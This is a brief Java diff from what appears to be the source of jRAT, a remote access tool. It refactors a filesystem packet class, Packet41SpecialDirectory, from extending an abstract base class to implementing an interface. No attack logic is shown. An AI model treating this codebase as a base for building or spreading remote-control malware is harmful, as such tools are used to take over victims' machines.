@@ -1,11 +1,11 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPacket;
 import jrat.common.DropLocations;
 import oslib.OperatingSystem;
 
-public class Packet41SpecialDirectory extends AbstractIncomingPacket {
+public class Packet41SpecialDirectory implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
